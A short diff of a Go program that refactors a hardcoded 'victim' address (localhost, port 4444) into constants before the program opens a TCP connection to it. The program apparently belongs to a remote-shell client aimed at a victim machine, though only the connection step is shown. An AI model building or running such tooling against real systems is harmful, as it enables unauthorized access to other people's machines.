@@ -10,10 +10,12 @@ import (
 	"golang.org/x/term"
 )
 
-func main() {
-	victimIP := "localhost"
-	victimPort := "4444"
+	const (
+        victimIP = "localhost"
+        victimPort = "4444"
+    )
 
+func main() {
 	conn, err := net.Dial("tcp", victimIP+":"+victimPort)
 	if err != nil {
 		fmt.Println("Failed to connect to victim:", err)
